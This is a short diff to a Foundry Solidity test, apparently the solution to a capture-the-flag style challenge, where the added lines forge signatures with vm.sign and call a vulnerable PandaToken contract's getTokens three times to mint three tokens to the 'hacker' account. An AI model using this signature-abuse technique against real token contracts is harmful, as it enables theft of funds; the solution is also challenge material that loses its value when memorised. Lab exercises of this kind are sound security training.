@@ -21,8 +21,13 @@ contract Hack is Test {
 
         // Objetivo: conseguir 3 tokens en tu balance (hacker)
         // solution
-        ...
-       
+        (v, r, s) = vm.sign(1, hash);
+        pandatoken.getTokens(1 ether, abi.encodePacked(uint256(0), r, s, v));
+        (v, r, s) = vm.sign(2, hash);
+        pandatoken.getTokens(1 ether, abi.encodePacked(uint256(0), r, s, v));
+        (v, r, s) = vm.sign(3, hash);
+        pandatoken.getTokens(1 ether, abi.encodePacked(uint256(0), r, s, v));
+
 
         assertEq(pandatoken.balanceOf(hacker), 3 ether);
     }
